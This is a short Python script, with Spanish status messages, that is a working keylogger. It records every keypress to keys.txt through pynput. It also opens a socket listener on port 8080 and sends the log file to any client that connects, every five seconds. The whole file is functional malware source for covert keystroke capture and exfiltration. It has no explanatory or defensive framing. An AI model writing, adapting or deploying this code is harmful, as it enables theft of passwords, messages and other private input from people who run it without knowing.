from pynput.keyboard import Key, Listener
import logging
import socket
import _thread
import time

log_dir = ""

logging.basicConfig(filename=(log_dir + "keys.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

s = socket.socket()
host = ""

port = 8080
s.bind((host,port))
s.listen(1)
print("Esperando conexión...")
conn, addr = s.accept()
print(addr, " se ha conectado")

filename = "keys.txt"

def enviarKeylogs():
    while True:
        file = open(filename, 'rb')

        file_data = file.read(4096)

        conn.send(file_data)
        print("Archivo enviado satisfactoriamente")
        time.sleep(5)

def on_press(key):
    logging.info(str(key))

def setListener():
    with Listener(on_press=on_press) as listener:
        listener.join()
try:
   _thread.start_new_thread(enviarKeylogs,())
   _thread.start_new_thread(setListener,())
except Exception as e:
    print ("Error: unable to start thread")
    print(e)

while 1:
   pass




    
